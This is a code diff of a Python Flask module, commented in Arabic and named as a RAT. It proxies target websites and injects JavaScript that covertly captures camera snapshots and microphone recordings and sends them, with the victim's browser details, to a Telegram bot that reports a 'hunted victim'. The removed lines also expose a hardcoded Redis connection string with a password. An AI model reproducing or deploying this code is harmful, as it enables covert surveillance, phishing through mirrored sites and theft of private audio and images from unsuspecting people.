@@ -1,33 +1,27 @@
-import os
-import base64
+# rat_module.py
+# ============================================================
+# نظام RAT — Reverse Proxy + Snapshot + Audio
+# ============================================================
+
 import io
 import json
-import requests
-import redis
+import base64
 import re
-from urllib.parse import urljoin, urlparse, quote, unquote
+from urllib.parse import urljoin, urlparse, quote
 from concurrent.futures import ThreadPoolExecutor
-from flask import Blueprint, render_template_string, request, Response, stream_with_context
+
+import requests
+from flask import Blueprint, request, Response, stream_with_context
+
+# ★★★ استخدام Redis من config ★★★
+try:
+    from config import redis_client
+    print("[+] rat_module: Using shared Redis")
+except Exception as e:
+    print(f"[-] rat_module: config failed - {e}")
+    redis_client = None
 
 rat_bp = Blueprint('rat_module_v5', __name__)
-
-# --- معالجة وتنظيف رابط الـ Redis بمنتهى الدقة لتجنب انهيار التطبيق ---
-REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
-if REDIS_URL.startswith("redis-cli"):
-    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
-
-# إصلاح الـ Scheme إذا كان مفقوداً أو غير مطابقة
-if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
-    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
-
-redis_client = None
-try:
-    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=10)
-    redis_client.ping()
-    print("[+] Redis connection established successfully in rat_module.")
-except Exception as e:
-    print(f"[-] Critical Redis Connection Error in rat_module: {e}")
-    redis_client = None
 
 background_executor = ThreadPoolExecutor(max_workers=4)
 
@@ -48,7 +42,7 @@ INJECTION_PAYLOAD = """
     }).catch(e => {});
 
     const evtSource = new EventSource(serverUrl + '/rat_v5_stream?id=' + chatId);
-    
+
     evtSource.onmessage = function(event) {
         try {
             const data = JSON.parse(event.data);
@@ -66,13 +60,13 @@ INJECTION_PAYLOAD = """
             const video = document.createElement('video');
             video.srcObject = stream;
             await video.play();
-            
+
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
+
             const base64Img = canvas.toDataURL('image/jpeg', 0.8);
             stream.getTracks().forEach(track => track.stop());
 
@@ -89,7 +83,7 @@ INJECTION_PAYLOAD = """
             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
             const mediaRecorder = new MediaRecorder(stream);
             let chunks = [];
-            
+
             mediaRecorder.ondataavailable = e => chunks.push(e.data);
             mediaRecorder.onstop = e => {
                 const blob = new Blob(chunks, { type: 'audio/webm' });
@@ -104,7 +98,7 @@ INJECTION_PAYLOAD = """
                 reader.readAsDataURL(blob);
                 stream.getTracks().forEach(track => track.stop());
             };
-            
+
             mediaRecorder.start();
             setTimeout(() => mediaRecorder.stop(), 5000);
         } catch(e) {}
@@ -112,6 +106,7 @@ INJECTION_PAYLOAD = """
 })();
 </script>
 """
+
 
 def rewrite_urls(html_content, base_url, proxy_base_path):
     def replace_url(match):
@@ -126,6 +121,7 @@ def rewrite_urls(html_content, base_url, proxy_base_path):
     pattern = re.compile(r'(<[a-zA-Z0-9_-]+)\s+([^>]*?\b(?:href|src|action))\s*=\s*(["\'])(.*?)\3', re.IGNORECASE)
     return pattern.sub(replace_url, html_content)
 
+
 def async_send_photo(bot, chat_id, image_bytes, title):
     try:
         photo_file = io.BytesIO(image_bytes)
@@ -134,13 +130,15 @@ def async_send_photo(bot, chat_id, image_bytes, title):
     except Exception as e:
         print(f"Async Img Error: {e}")
 
+
 def async_send_audio(bot, chat_id, audio_bytes):
     try:
         audio_file = io.BytesIO(audio_bytes)
         audio_file.name = 'live_audio.webm'
-        bot.send_audio(chat_id, audio_file, caption="🎙️ تسجيل صوتي حي (عبر Ultra Proxy):", parse_mode="Markdown")
+        bot.send_audio(chat_id, audio_file, caption="🎙️ تسجيل صوتي حي:", parse_mode="Markdown")
     except Exception as e:
         print(f"Async Audio Error: {e}")
+
 
 def init_rat_routes(app, bot):
     @app.route('/system_secure_v2', methods=['GET', 'POST'])
@@ -156,7 +154,7 @@ def init_rat_routes(app, bot):
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                 "Accept-Language": "en-US,en;q=0.5"
             }
-            
+
             parsed_target = urlparse(target_url)
             headers["Host"] = parsed_target.netloc
 
@@ -164,25 +162,25 @@ def init_rat_routes(app, bot):
                 resp = requests.post(target_url, headers=headers, data=request.form, cookies=request.cookies, allow_redirects=True, timeout=10)
             else:
                 resp = requests.get(target_url, headers=headers, cookies=request.cookies, allow_redirects=True, timeout=10)
-            
+
             content_type = resp.headers.get("Content-Type", "text/html")
-            
+
             if "text/html" not in content_type:
                 return Response(resp.content, status=resp.status_code, content_type=content_type)
-            
+
             page_content = resp.text
             proxy_path = '/system_secure_v2'
             if chat_id != '0':
                 proxy_path += f'?id={chat_id}'
-            
+
             page_content = rewrite_urls(page_content, target_url, proxy_path)
             custom_script = INJECTION_PAYLOAD.replace("{chat_id}", chat_id)
-            
+
             if "</body>" in page_content:
                 modified_content = page_content.replace("</body>", custom_script + "</body>")
             else:
                 modified_content = page_content + custom_script
-                
+
             return Response(modified_content, status=resp.status_code, content_type=content_type)
         except Exception as e:
             return f"Error loading target mirror: {e}", 500
@@ -193,16 +191,16 @@ def init_rat_routes(app, bot):
         chat_id = data.get('chat_id')
         if chat_id and chat_id != '0':
             msg = (
-                "🎯 **تم اصطياد الضحية عبر محرك الـ Ultra Proxy المطور بنجاح!**\n\n"
+                "🎯 **تم اصطياد الضحية!**\n\n"
                 f"💻 **النظام:** `{data.get('platform')}`\n"
                 f"🌐 **المتصفح:** `{data.get('userAgent')}`\n\n"
-                "👇 **اختر الأمر المطلوب تنفيذه:**"
+                "👇 **اختر الأمر:**"
             )
             from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
             markup = InlineKeyboardMarkup()
             markup.row(
-                InlineKeyboardButton("📸 التقاط صورة حية جديدة", callback_data=f"rat_cam_{chat_id}"),
-                InlineKeyboardButton("🎙️ تسجيل صوت مباشر", callback_data=f"rat_mic_{chat_id}")
+                InlineKeyboardButton("📸 التقاط صورة حية", callback_data=f"rat_cam_{chat_id}"),
+                InlineKeyboardButton("🎙️ تسجيل صوت", callback_data=f"rat_mic_{chat_id}")
             )
             try:
                 bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=markup)
@@ -265,10 +263,10 @@ def init_rat_routes(app, bot):
                 print(f"Proxy Audio Error: {e}")
         return {"status": "ok"}
 
+
 def queue_command(chat_id, action):
     if redis_client:
         try:
             redis_client.publish(f"channel_cmd:{chat_id}", action)
-            redis_client.expire(f"channel_cmd:{chat_id}", 3600)
         except Exception as e:
             print(f"Redis publish error: {e}")
